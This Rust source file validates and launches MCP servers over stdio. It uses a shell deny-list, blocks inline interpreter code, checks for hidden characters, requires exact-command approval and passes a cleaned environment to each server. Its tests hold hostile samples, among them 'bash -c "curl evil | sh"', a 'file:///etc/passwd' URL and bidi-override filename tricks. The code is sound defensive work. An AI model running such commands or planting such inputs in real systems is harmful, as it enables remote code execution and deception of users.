//! MCP servers on stdio (plan W7.18, W10.C1), per the 2026-07-28 stdio binding:
//! the client launches the server as a subprocess, writes one JSON-RPC message
//! per line to its stdin, reads one per line from its stdout, and may capture
//! its stderr (logs only; protocol logging is deprecated). To stop it, the
//! client closes stdin, waits, and then kills it.
//!
//! What this crate decides, so the Tauri glue (src-tauri/src/mcp_stdio.rs) only
//! wires it:
//! - **Which commands may run.** Only a command the user approved in a native
//!   dialog (the WebView cannot approve one itself) and that passes `validate`:
//!   no shell or launcher (a shell runs anything; Windows names, WSL and
//!   busybox too), no interpreter given code on the command line (python -c,
//!   node -e, perl -e, ruby -e, osascript -e, deno eval, ...), no `npx -y`
//!   (it downloads and runs a package), no control, format (bidi override,
//!   zero-width) or non-ASCII space characters, bounded sizes. An approval is
//!   for the exact command, arguments and folder (`Spec::canonical`), and the
//!   dialog shows them quoted, one argument per line (`approval_text`). The
//!   deny-list narrows what can be asked for; the dialog is the gate (R8-M4).
//! - **The process.** A clean environment (PATH, HOME and the few variables a
//!   program needs to start; never the app's secrets), its own folder, stdin,
//!   stdout and stderr piped. Lines over the limit are dropped with a note.
//! - **Writing.** Each session has its own writer thread and queue; a write
//!   waits at most `WRITE_TIMEOUT` for the server to take it (R8-M3), so a
//!   server that stops reading cannot hold the caller.
//! - **Shutdown.** Close stdin, wait for the grace period, then kill.
//! - **Opening a URL** in the system browser (elicitation URL mode): only
//!   http and https, so the client and the model never see the page.

use std::io::{BufRead, BufReader, Read, Write};
use std::process::{Child, ChildStdin, Command, Stdio};
use std::sync::mpsc::{self, RecvTimeoutError, TrySendError};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant};

/// Longest stdout line (one JSON-RPC message) we accept.
pub const MAX_LINE: usize = 4 * 1024 * 1024;
/// Longest stderr line kept (the rest is cut).
pub const MAX_ERR_LINE: usize = 8 * 1024;
pub const MAX_ARGS: usize = 64;
pub const MAX_FIELD: usize = 4096;

/// Programs that would run whatever their arguments say. Windows names too (Git for Windows' bash.exe, WSL).
const SHELLS: &[&str] = &[
    "sh", "sh.exe", "bash", "bash.exe", "zsh", "zsh.exe", "dash", "fish", "fish.exe", "ksh", "csh", "tcsh", "cmd", "cmd.exe", "powershell", "powershell.exe", "pwsh", "pwsh.exe", "env", "env.exe", "wsl", "wsl.exe", "busybox", "busybox.exe",
];

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Spec {
    pub command: String,
    pub args: Vec<String>,
    pub cwd: Option<String>,
}

fn base_name(cmd: &str) -> String {
    cmd.rsplit(|c| c == '/' || c == '\\').next().unwrap_or(cmd).to_ascii_lowercase()
}

/// Unicode format characters (General_Category Cf): bidi overrides and isolates, zero-width
/// characters, the BOM, tags. They change what the approval dialog shows without changing what runs.
fn is_format(c: char) -> bool {
    matches!(c as u32,
        0x00AD | 0x0600..=0x0605 | 0x061C | 0x06DD | 0x070F | 0x0890..=0x0891 | 0x08E2 | 0x180E
        | 0x200B..=0x200F | 0x202A..=0x202E | 0x2060..=0x2064 | 0x2066..=0x206F | 0xFEFF | 0xFFF9..=0xFFFB
        | 0x110BD | 0x110CD | 0x13430..=0x1343F | 0x1BCA0..=0x1BCA3 | 0x1D173..=0x1D17A | 0xE0001 | 0xE0020..=0xE007F)
}

/// Anything the dialog could not show as it is: control characters, format characters, the line
/// and paragraph separators, and any whitespace but a plain ASCII space (R8-M4).
fn has_hidden(s: &str) -> bool {
    s.chars().any(|c| c.is_control() || is_format(c) || c == '\u{2028}' || c == '\u{2029}' || (c.is_whitespace() && c != ' '))
}

/// The interpreter family of a program name (without .exe and a version), for the inline-code check.
fn interpreter(name: &str) -> Option<&'static str> {
    let n = name.strip_suffix(".exe").unwrap_or(name);
    let stem = n.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.');
    let stem = stem.strip_suffix('w').filter(|s| *s == "python").unwrap_or(stem);
    match stem {
        "python" | "py" | "pypy" => Some("python"),
        "node" | "nodejs" => Some("node"),
        "deno" => Some("deno"),
        "bun" => Some("bun"),
        "perl" => Some("perl"),
        "ruby" => Some("ruby"),
        "osascript" => Some("osascript"),
        "php" => Some("php"),
        "lua" | "luajit" => Some("lua"),
        "rscript" => Some("rscript"),
        _ => None,
    }
}

/// An argument that hands the interpreter code to run from the command line itself.
fn inline_code(family: &str, arg: &str) -> bool {
    let short = |letters: &str| arg.len() >= 2 && arg.starts_with('-') && !arg.starts_with("--") && arg[1..].chars().all(|c| c.is_ascii_alphabetic()) && arg.ends_with(|c: char| letters.contains(c));
    match family {
        // python -c, also in a cluster (-Ic, -uc).
        "python" => short("c"),
        "node" => matches!(arg, "-e" | "-p" | "--eval" | "--print") || arg.starts_with("--eval=") || arg.starts_with("--print="),
        "deno" => matches!(arg, "eval" | "repl"),
        "bun" => matches!(arg, "-e" | "-p" | "--eval" | "--print"),
        // perl -e / -E, also clustered (-ne, -lane).
        "perl" => short("eE"),
        "ruby" => short("e"),
        "osascript" => arg == "-e",
        "php" => arg == "-r" || arg == "--run",
        "lua" => arg == "-e",
        "rscript" => arg == "-e",
        _ => false,
    }
}

impl Spec {
    /// Why this command may not run at all (even approved), or Ok.
    pub fn validate(&self) -> Result<(), String> {
        if self.command.trim().is_empty() {
            return Err("no command".into());
        }
        if self.command != self.command.trim() {
            return Err("the command has spaces around it".into());
        }
        if self.args.len() > MAX_ARGS {
            return Err(format!("more than {MAX_ARGS} arguments"));
        }
        let fields = std::iter::once(&self.command).chain(self.args.iter()).chain(self.cwd.iter());
        for f in fields {
            if f.len() > MAX_FIELD {
                return Err(format!("a field is longer than {MAX_FIELD} bytes"));
            }
            if has_hidden(f) {
                return Err("a field has a control or invisible character (a new line, a NUL, a direction override, a non-ASCII space)".into());
            }
        }
        let name = base_name(&self.command);
        if SHELLS.contains(&name.as_str()) {
            return Err(format!("\"{name}\" is a shell or launcher: it would run anything; name the server's own program"));
        }
        if (name == "npx" || name == "npx.cmd" || name == "pnpx" || name == "bunx") && self.args.iter().any(|a| a == "-y" || a == "--yes") {
            return Err("npx -y downloads and runs a package without asking: install the server first and name its program".into());
        }
        if let Some(family) = interpreter(&name) {
            if let Some(a) = self.args.iter().find(|a| inline_code(family, a)) {
                return Err(format!("\"{name} {a}\" runs code written in the command line: name the server's script or module instead"));
            }
        }
        if let Some(cwd) = &self.cwd {
            if cwd.trim().is_empty() {
                return Err("the folder is empty".into());
            }
        }
        Ok(())
    }

    /// One line that names exactly this command, its arguments and folder.
    /// Two specs approve each other only when this is equal.
    pub fn canonical(&self) -> String {
        let mut out = String::from("[");
        out.push_str(&quote(&self.command));
        for a in &self.args {
            out.push(',');
            out.push_str(&quote(a));
        }
        out.push_str("]@");
        out.push_str(&self.cwd.as_deref().map(quote).unwrap_or_else(|| "null".into()));
        out
    }
}

/// JSON string quoting (so the canonical line is one line, whatever the field holds).
fn quote(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 2);
    out.push('"');
    for c in s.chars() {
        match c {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            c if (c as u32) < 0x20 => out.push_str(&format!("\\u{:04x}", c as u32)),
            c => out.push(c),
        }
    }
    out.push('"');
    out
}

/// A field as the approval dialog shows it: JSON-quoted (so its ends and inner quotes are
/// visible), with a long run of spaces written as a count instead of pushing the rest away.
pub fn shown_field(s: &str) -> String {
    let q = quote(s);
    let mut out = String::with_capacity(q.len());
    let mut run = 0usize;
    let flush = |out: &mut String, run: usize| {
        if run > 3 {
            out.push_str(&format!("\u{2423}×{run}"));
        } else {
            out.extend(std::iter::repeat(' ').take(run));
        }
    };
    for c in q.chars() {
        if c == ' ' {
            run += 1;
            continue;
        }
        flush(&mut out, run);
        run = 0;
        out.push(c);
    }
    flush(&mut out, run);
    out
}

/// The text of the native "Run an MCP server?" dialog (R8-M4): the server's name marked as
/// the page's claim (the WebView chooses it), the program, then each argument quoted on its own line.
pub fn approval_text(server: &str, spec: &Spec) -> String {
    let label: String = server.chars().filter(|c| !c.is_control() && !is_format(*c)).take(80).collect();
    let mut t = String::new();
    t.push_str("A page in Lumen asks to run a program on your computer for an MCP server it calls ");
    t.push_str(&shown_field(&label));
    t.push_str(" (that name comes from the page and is not checked).\n\nProgram:\n  ");
    t.push_str(&shown_field(&spec.command));
    if spec.args.is_empty() {
        t.push_str("\n\nNo arguments.");
    } else {
        t.push_str(&format!("\n\nArguments ({}), one per line:", spec.args.len()));
        for (i, a) in spec.args.iter().enumerate() {
            t.push_str(&format!("\n  {}. {}", i + 1, shown_field(a)));
        }
    }
    t.push_str("\n\nFolder:\n  ");
    t.push_str(&spec.cwd.as_deref().map(shown_field).unwrap_or_else(|| "(Lumen's default)".into()));
    t.push_str("\n\nIt runs with your user's rights. Allow only a program you installed and trust.");
    t
}

/// The commands the user approved, one canonical line each (the file the glue keeps).
#[derive(Default, Debug, Clone)]
pub struct Approved {
    lines: Vec<String>,
}

impl Approved {
    pub fn parse(text: &str) -> Self {
        let mut lines: Vec<String> = Vec::new();
        for l in text.lines() {
            let l = l.trim_end_matches('\r');
            if l.starts_with('[') && !lines.iter().any(|x| x == l) {
                lines.push(l.to_string());
            }
        }
        Approved { lines }
    }
    pub fn serialize(&self) -> String {
        let mut s = self.lines.join("\n");
        if !s.is_empty() {
            s.push('\n');
        }
        s
    }
    pub fn contains(&self, spec: &Spec) -> bool {
        let c = spec.canonical();
        self.lines.iter().any(|l| *l == c)
    }
    pub fn add(&mut self, spec: &Spec) {
        if !self.contains(spec) {
            self.lines.push(spec.canonical());
        }
    }
    pub fn remove(&mut self, spec: &Spec) -> bool {
        let c = spec.canonical();
        let before = self.lines.len();
        self.lines.retain(|l| *l != c);
        before != self.lines.len()
    }
    pub fn len(&self) -> usize {
        self.lines.len()
    }
    pub fn is_empty(&self) -> bool {
        self.lines.is_empty()
    }
}

/// Spawn is allowed only for a valid, approved spec.
pub fn may_spawn(spec: &Spec, approved: &Approved) -> Result<(), String> {
    spec.validate()?;
    if !approved.contains(spec) {
        return Err("not approved: Lumen runs a server's command only after you approve it".into());
    }
    Ok(())
}

/// What the program gets from the app's environment: enough to start, nothing secret.
pub const KEPT_ENV: &[&str] = &["PATH", "HOME", "USERPROFILE", "APPDATA", "LOCALAPPDATA", "SystemRoot", "TEMP", "TMP", "TMPDIR", "LANG", "LC_ALL"];

pub fn clean_env(from: impl Iterator<Item = (String, String)>) -> Vec<(String, String)> {
    from.filter(|(k, _)| KEPT_ENV.contains(&k.as_str())).collect()
}

/// The command that opens `url` in the system browser, for `os` ("macos", "linux", "windows").
pub fn open_url_command(url: &str, os: &str) -> Result<(String, Vec<String>), String> {
    let lower = url.to_ascii_lowercase();
    if !(lower.starts_with("https://") || lower.starts_with("http://")) {
        return Err("only http and https addresses open".into());
    }
    if url.len() > 8192 || url.chars().any(|c| c.is_whitespace() || c.is_control() || c == '"') {
        return Err("the address has spaces, quotes or control characters".into());
    }
    match os {
        "macos" => Ok(("open".into(), vec![url.into()])),
        // FileProtocolHandler takes the address as one argument: no shell parses it (unlike `cmd /c start`).
        "windows" => Ok(("rundll32".into(), vec!["url.dll,FileProtocolHandler".into(), url.into()])),
        _ => Ok(("xdg-open".into(), vec![url.into()])),
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Event {
    /// One line of stdout: a JSON-RPC message (the client parses it).
    Out(String),
    /// One line of stderr: a log line.
    Err(String),
    /// The process ended (its exit code when it has one).
    Exit(Option<i32>),
}

/// How long one write may wait for the server to take the message off its stdin (R8-M3).
pub const WRITE_TIMEOUT: Duration = Duration::from_secs(10);
/// Messages waiting for the writer thread; one more is refused (the server is not reading).
const WRITE_QUEUE: usize = 32;

type WriteJob = (String, mpsc::SyncSender<Result<(), String>>);

/// One running server. Every method takes `&self`, so the glue can hold it in an `Arc` and do the
/// blocking work without any shared lock (R8-M3): writes go through this session's own writer thread.
pub struct Session {
    child: Arc<Mutex<Child>>,
    writer: Mutex<Option<mpsc::SyncSender<WriteJob>>>,
}

/// The writer thread: owns the server's stdin, writes each queued line, answers on the job's channel.
fn start_writer(mut w: ChildStdin) -> mpsc::SyncSender<WriteJob> {
    let (tx, rx) = mpsc::sync_channel::<WriteJob>(WRITE_QUEUE);
    thread::spawn(move || {
        for (line, done) in rx {
            let r = w.write_all(line.as_bytes()).and_then(|_| w.write_all(b"\n")).and_then(|_| w.flush()).map_err(|e| format!("the server stopped reading: {e}"));
            let failed = r.is_err();
            let _ = done.send(r);
            if failed {
                break;
            }
        }
        // The queue closed (close()) or a write failed: stdin is dropped here, which the server sees as EOF.
    });
    tx
}

fn read_lines<R: Read>(r: R, max: usize, cut: bool, mut emit: impl FnMut(String)) {
    let mut reader = BufReader::new(r);
    let mut buf: Vec<u8> = Vec::new();
    loop {
        buf.clear();
        // Read one line, but never hold more than `max` bytes of it.
        let mut too_long = false;
        loop {
            let chunk = match reader.fill_buf() {
                Ok(c) => c,
                Err(_) => return,
            };
            if chunk.is_empty() {
                if buf.is_empty() && !too_long {
                    return;
                }
                break;
            }
            let (part, done) = match chunk.iter().position(|b| *b == b'\n') {
                Some(i) => (&chunk[..i], Some(i + 1)),
                None => (chunk, None),
            };
            if !too_long {
                let room = max.saturating_sub(buf.len());
                if part.len() > room {
                    buf.extend_from_slice(&part[..room]);
                    too_long = true;
                } else {
                    buf.extend_from_slice(part);
                }
            }
            let used = done.unwrap_or(chunk.len());
            reader.consume(used);
            if done.is_some() {
                break;
            }
        }
        let line = String::from_utf8_lossy(&buf).trim_end_matches('\r').to_string();
        if too_long && !cut {
            emit(format!("\u{0}line longer than {max} bytes dropped"));
        } else {
            emit(line);
        }
    }
}

/// Start `spec` (the caller checked `may_spawn`). Events arrive on other threads.
pub fn spawn(spec: &Spec, env: Vec<(String, String)>, on_event: impl Fn(Event) + Send + Sync + 'static) -> Result<Session, String> {
    let mut cmd = Command::new(&spec.command);
    cmd.args(&spec.args).env_clear().envs(env).stdin(Stdio::piped()).stdout(Stdio::piped()).stderr(Stdio::piped());
    if let Some(cwd) = &spec.cwd {
        cmd.current_dir(cwd);
    }
    let mut child = cmd.spawn().map_err(|e| format!("could not start {}: {e}", spec.command))?;
    let stdin = child.stdin.take();
    let stdout = child.stdout.take().ok_or("no stdout")?;
    let stderr = child.stderr.take().ok_or("no stderr")?;
    let child = Arc::new(Mutex::new(child));
    let on_event = Arc::new(on_event);
    {
        let ev = on_event.clone();
        thread::spawn(move || read_lines(stderr, MAX_ERR_LINE, true, |l| ev(Event::Err(l))));
    }
    {
        let ev = on_event.clone();
        let child = child.clone();
        thread::spawn(move || {
            read_lines(stdout, MAX_LINE, false, |l| {
                if let Some(note) = l.strip_prefix('\u{0}') {
                    ev(Event::Err(note.to_string()));
                } else if !l.is_empty() {
                    ev(Event::Out(l));
                }
            });
            // stdout closed: the process is ending. Wait a little for its code.
            let until = Instant::now() + Duration::from_secs(2);
            let mut code = None;
            while Instant::now() < until {
                if let Ok(mut c) = child.lock() {
                    if let Ok(Some(s)) = c.try_wait() {
                        code = s.code();
                        break;
                    }
                }
                thread::sleep(Duration::from_millis(20));
            }
            ev(Event::Exit(code));
        });
    }
    Ok(Session { child, writer: Mutex::new(stdin.map(start_writer)) })
}

impl Session {
    /// Write one JSON-RPC message, waiting at most `WRITE_TIMEOUT`. A message is one line
    /// (spec: messages MUST NOT contain embedded newlines).
    pub fn write_line(&self, line: &str) -> Result<(), String> {
        self.write_line_within(line, WRITE_TIMEOUT)
    }

    /// The same, with its own timeout. A timed-out message may still reach the server later;
    /// the caller treats the server as stuck (closing it kills it).
    pub fn write_line_within(&self, line: &str, timeout: Duration) -> Result<(), String> {
        if line.contains('\n') || line.contains('\r') {
            return Err("a message must be one line".into());
        }
        if line.len() > MAX_LINE {
            return Err("the message is too long".into());
        }
        let tx = self.writer.lock().map_err(|_| "EIO: lock")?.clone().ok_or("the server's input is closed")?;
        let (done, answer) = mpsc::sync_channel(1);
        tx.try_send((line.to_string(), done)).map_err(|e| match e {
            TrySendError::Full(_) => "the server is not reading its input (too many messages waiting)".to_string(),
            TrySendError::Disconnected(_) => "the server's input is closed".to_string(),
        })?;
        match answer.recv_timeout(timeout) {
            Ok(r) => r,
            Err(RecvTimeoutError::Timeout) => Err(format!("the server did not read the message within {} ms", timeout.as_millis())),
            Err(RecvTimeoutError::Disconnected) => Err("the server's input is closed".into()),
        }
    }

    /// Close stdin, wait up to `grace`, then kill. Returns the exit code when there is one.
    pub fn close(&self, grace: Duration) -> Option<i32> {
        // Dropping the queue ends the writer thread, which drops stdin (a writer stuck in a write
        // ends when the process is killed below).
        if let Ok(mut w) = self.writer.lock() {
            w.take();
        }
        let until = Instant::now() + grace;
        loop {
            if let Ok(mut c) = self.child.lock() {
                match c.try_wait() {
                    Ok(Some(s)) => return s.code(),
                    Ok(None) if Instant::now() >= until => {
                        let _ = c.kill();
                        return c.wait().ok().and_then(|s| s.code());
                    }
                    Ok(None) => {}
                    Err(_) => return None,
                }
            }
            thread::sleep(Duration::from_millis(20));
        }
    }

    pub fn running(&self) -> bool {
        self.child.lock().map(|mut c| matches!(c.try_wait(), Ok(None))).unwrap_or(false)
    }
}

impl Drop for Session {
    fn drop(&mut self) {
        if self.running() {
            self.close(Duration::from_millis(200));
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::mpsc;

    fn spec(cmd: &str, args: &[&str]) -> Spec {
        Spec { command: cmd.into(), args: args.iter().map(|s| s.to_string()).collect(), cwd: None }
    }

    #[test]
    fn shells_launchers_and_npx_yes_never_run() {
        for s in ["sh", "/bin/bash", "C:\\Windows\\System32\\cmd.exe", "pwsh", "/usr/bin/env"] {
            assert!(spec(s, &["-c", "x"]).validate().is_err(), "{s}");
        }
        assert!(spec("npx", &["-y", "@modelcontextprotocol/server-everything"]).validate().is_err());
        assert!(spec("npx", &["--yes", "x"]).validate().is_err());
        assert!(spec("mcp-server-filesystem", &["/home/u/notes"]).validate().is_ok());
        assert!(spec("python3", &["-I", "-m", "mcp_server.server"]).validate().is_ok());
    }

    #[test]
    fn control_characters_and_sizes_are_refused() {
        assert!(spec("node", &["a\nb"]).validate().is_err());
        assert!(spec("no\u{0}de", &[]).validate().is_err());
        assert!(spec(" node", &[]).validate().is_err());
        assert!(spec("", &[]).validate().is_err());
        let many: Vec<String> = (0..65).map(|i| i.to_string()).collect();
        let s = Spec { command: "node".into(), args: many, cwd: None };
        assert!(s.validate().is_err());
        assert!(spec("node", &[&"x".repeat(MAX_FIELD + 1)]).validate().is_err());
    }

    #[test]
    fn an_approval_is_for_the_exact_command_arguments_and_folder() {
        let a = spec("mcp-server-filesystem", &["/home/u/notes"]);
        let mut ok = Approved::default();
        assert!(may_spawn(&a, &ok).is_err(), "nothing runs before approval");
        ok.add(&a);
        assert!(may_spawn(&a, &ok).is_ok());
        assert!(may_spawn(&spec("mcp-server-filesystem", &["/"]), &ok).is_err(), "other arguments");
        assert!(may_spawn(&spec("mcp-server-filesystem", &["/home/u/notes", "/etc"]), &ok).is_err(), "an extra argument");
        let mut b = a.clone();
        b.cwd = Some("/tmp".into());
        assert!(may_spawn(&b, &ok).is_err(), "another folder");
        // ["a b"] and ["a","b"] differ.
        assert_ne!(spec("x", &["a b"]).canonical(), spec("x", &["a", "b"]).canonical());
        assert_ne!(spec("x", &["a\",\"b"]).canonical(), spec("x", &["a", "b"]).canonical());
        // Persisted and read back.
        let back = Approved::parse(&ok.serialize());
        assert!(back.contains(&a));
        assert_eq!(back.len(), 1);
        let mut back = back;
        assert!(back.remove(&a));
        assert!(may_spawn(&a, &back).is_err(), "revoked");
    }

    #[test]
    fn a_valid_but_dangerous_spec_is_refused_even_when_listed() {
        let bad = spec("bash", &["-c", "curl evil | sh"]);
        let mut ok = Approved::default();
        ok.add(&bad);
        assert!(may_spawn(&bad, &ok).is_err());
    }

    #[test]
    fn the_environment_keeps_only_what_a_program_needs() {
        let env = vec![("PATH".to_string(), "/usr/bin".to_string()), ("OPENAI_API_KEY".to_string(), "sk-x".to_string()), ("HOME".to_string(), "/home/u".to_string()), ("AWS_SECRET_ACCESS_KEY".into(), "y".into())];
        let kept = clean_env(env.into_iter());
        assert_eq!(kept, vec![("PATH".to_string(), "/usr/bin".to_string()), ("HOME".to_string(), "/home/u".to_string())]);
    }

    #[test]
    fn urls_open_only_over_http_with_no_shell() {
        assert_eq!(open_url_command("https://example.com/a?b=1", "linux").unwrap(), ("xdg-open".to_string(), vec!["https://example.com/a?b=1".to_string()]));
        assert_eq!(open_url_command("https://x.org", "macos").unwrap().0, "open");
        assert_eq!(open_url_command("https://x.org/&calc", "windows").unwrap().1, vec!["url.dll,FileProtocolHandler".to_string(), "https://x.org/&calc".to_string()]);
        for bad in ["javascript:alert(1)", "file:///etc/passwd", "https://x.org/ a", "https://x.org/\n", "ftp://x.org", "https://x.org/\"x"] {
            assert!(open_url_command(bad, "linux").is_err(), "{bad}");
        }
    }

    #[cfg(unix)]
    #[test]
    fn a_real_process_lines_in_lines_out_stderr_and_exit() {
        let (tx, rx) = mpsc::channel();
        let tx = Mutex::new(tx);
        let s = spawn(&spec("cat", &[]), clean_env(std::env::vars()), move |e| {
            let _ = tx.lock().unwrap().send(e);
        })
        .unwrap();
        s.write_line(r#"{"jsonrpc":"2.0","id":1,"method":"server/discover"}"#).unwrap();
        assert_eq!(rx.recv_timeout(Duration::from_secs(5)).unwrap(), Event::Out(r#"{"jsonrpc":"2.0","id":1,"method":"server/discover"}"#.into()));
        assert!(s.write_line("two\nlines").is_err());
        // Closing stdin ends cat by itself.
        let code = s.close(Duration::from_secs(5));
        assert_eq!(code, Some(0));
        let mut saw_exit = false;
        while let Ok(e) = rx.recv_timeout(Duration::from_secs(5)) {
            if let Event::Exit(_) = e {
                saw_exit = true;
                break;
            }
        }
        assert!(saw_exit);
    }

    #[cfg(unix)]
    #[test]
    fn stderr_is_a_log_and_a_server_that_ignores_stdin_is_killed_after_the_grace() {
        let (tx, rx) = mpsc::channel();
        let tx = Mutex::new(tx);
        // `sh` is refused by validate(); spawn() itself is what the glue calls after may_spawn.
        let s = spawn(&spec("sh", &["-c", "echo started >&2; exec sleep 30"]), clean_env(std::env::vars()), move |e| {
            let _ = tx.lock().unwrap().send(e);
        })
        .unwrap();
        assert_eq!(rx.recv_timeout(Duration::from_secs(5)).unwrap(), Event::Err("started".into()));
        let t = Instant::now();
        s.close(Duration::from_millis(300));
        assert!(t.elapsed() < Duration::from_secs(5));
        assert!(!s.running());
    }

    #[test]
    fn windows_shells_wsl_busybox_and_inline_code_never_run() {
        for s in ["C:\\Program Files\\Git\\bin\\bash.exe", "sh.exe", "wsl", "WSL.EXE", "busybox", "/bin/busybox"] {
            assert!(spec(s, &["x"]).validate().is_err(), "{s}");
        }
        for (cmd, args) in [
            ("python3", &["-c", "import os"][..]),
            ("python", &["-Ic", "x"]),
            ("python3.12", &["-u", "-c", "x"]),
            ("py.exe", &["-c", "x"]),
            ("node", &["-e", "x"]),
            ("node.exe", &["--eval=x"]),
            ("node", &["-p", "x"]),
            ("deno", &["eval", "x"]),
            ("bun", &["-e", "x"]),
            ("perl", &["-e", "x"]),
            ("perl", &["-lane", "x"]),
            ("ruby", &["-e", "x"]),
            ("osascript", &["-e", "do shell script \"x\""]),
            ("php", &["-r", "x"]),
            ("lua5.4", &["-e", "x"]),
            ("Rscript", &["-e", "x"]),
        ] {
            let e = spec(cmd, args).validate().unwrap_err();
            assert!(e.contains("code written in the command line"), "{cmd} {args:?}: {e}");
        }
        // A script or a module is fine.
        assert!(spec("python3", &["-I", "-m", "mcp_server.server"]).validate().is_ok());
        assert!(spec("node", &["/opt/mcp/server.js", "--port", "3000"]).validate().is_ok());
        assert!(spec("perl", &["server.pl", "--verbose"]).validate().is_ok());
        assert!(spec("deno", &["run", "--allow-read", "server.ts"]).validate().is_ok());
    }

    #[test]
    fn format_characters_and_odd_spaces_are_refused() {
        for bad in ["a\u{202E}gpj.exe", "\u{2066}x\u{2069}", "x\u{200B}y", "\u{FEFF}x", "a\u{2028}b", "a\u{00A0}b", "a\u{3000}b", "a\tb", "\u{E0041}"] {
            assert!(spec("node", &[bad]).validate().is_err(), "{bad:?}");
            assert!(spec(&format!("n{bad}"), &[]).validate().is_err(), "command {bad:?}");
            let mut s = spec("node", &[]);
            s.cwd = Some(format!("/tmp/{bad}"));
            assert!(s.validate().is_err(), "folder {bad:?}");
        }
        // Hebrew, accents and a plain space are text, not tricks.
        assert!(spec("node", &["/home/u/הערות/server.js", "café notes"]).validate().is_ok());
    }

    #[test]
    fn the_dialog_shows_each_argument_quoted_on_its_own_line_and_the_name_as_the_pages_claim() {
        let mut s = spec("node", &["server.js", "a b", &format!("x{}y", " ".repeat(500))]);
        s.cwd = Some("/home/u".into());
        let t = approval_text("Files \u{202E}evil", &s);
        assert!(t.contains("comes from the page and is not checked"), "{t}");
        assert!(t.contains("\"Files evil\""), "format characters taken out of the name: {t}");
        assert!(t.contains("Arguments (3), one per line:\n  1. \"server.js\"\n  2. \"a b\"\n  3. \"x\u{2423}×500y\""), "{t}");
        assert!(t.contains("Program:\n  \"node\""));
        assert!(t.contains("Folder:\n  \"/home/u\""));
        assert!(t.len() < 1000, "a run of spaces is counted, not shown");
        assert!(approval_text("x", &spec("srv", &[])).contains("No arguments."));
    }

    #[cfg(unix)]
    #[test]
    fn a_server_that_stops_reading_times_out_the_write_and_still_closes() {
        // `sleep` never reads stdin: once the pipe buffer is full, a write blocks.
        let s = spawn(&spec("sleep", &["30"]), clean_env(std::env::vars()), |_| {}).unwrap();
        let big = "x".repeat(1024 * 1024);
        let t = Instant::now();
        let mut timed_out = false;
        for _ in 0..4 {
            if let Err(e) = s.write_line_within(&big, Duration::from_millis(300)) {
                assert!(e.contains("did not read") || e.contains("not reading"), "{e}");
                timed_out = true;
                break;
            }
        }
        assert!(timed_out, "a 1 MB message cannot fit a pipe nobody reads");
        assert!(t.elapsed() < Duration::from_secs(5), "the caller is not held");
        // Another session is not affected (no shared lock).
        let (tx, rx) = mpsc::channel();
        let tx = Mutex::new(tx);
        let other = spawn(&spec("cat", &[]), clean_env(std::env::vars()), move |e| {
            let _ = tx.lock().unwrap().send(e);
        })
        .unwrap();
        other.write_line("ping").unwrap();
        assert_eq!(rx.recv_timeout(Duration::from_secs(5)).unwrap(), Event::Out("ping".into()));
        let t = Instant::now();
        s.close(Duration::from_millis(300));
        assert!(t.elapsed() < Duration::from_secs(5));
        assert!(!s.running());
        assert!(s.write_line("late").is_err(), "closed: no more writes");
        other.close(Duration::from_secs(2));
    }

    #[test]
    fn long_lines_are_dropped_on_stdout_and_cut_on_stderr() {
        let big = format!("{}\nok\n", "x".repeat(100));
        let mut got = Vec::new();
        read_lines(big.as_bytes(), 10, false, |l| got.push(l));
        assert_eq!(got.len(), 2);
        assert!(got[0].starts_with('\u{0}'));
        assert_eq!(got[1], "ok");
        let mut cut = Vec::new();
        read_lines(big.as_bytes(), 10, true, |l| cut.push(l));
        assert_eq!(cut, vec!["x".repeat(10), "ok".to_string()]);
    }
}
